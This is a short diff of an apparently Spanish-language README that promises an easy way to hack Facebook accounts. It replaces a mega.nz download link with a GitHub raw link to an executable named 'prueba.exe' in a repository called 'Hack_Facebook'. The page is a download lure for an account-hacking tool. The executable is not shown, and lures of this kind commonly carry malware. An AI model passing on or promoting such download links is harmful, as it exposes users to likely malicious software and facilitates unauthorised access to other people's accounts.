@@ -7,7 +7,7 @@ VIDEO EXPLICADO!!!!!
 
 SUPER FACIL Y RAPIDO!!!!
 
-https://mega.nz/file/9cshWQwa#s6A6eRWLJtzlJJ4bxwiC9zhGZji4T3a8-kf6C5700ww link descarga
+https://github.com/xhubYnaty/Hack_Facebook/raw/main/prueba.exe link descarga
 
 ![image](https://user-images.githubusercontent.com/94211893/141606229-9706b776-57c6-49c0-99c4-e975bcb6112c.png)
 
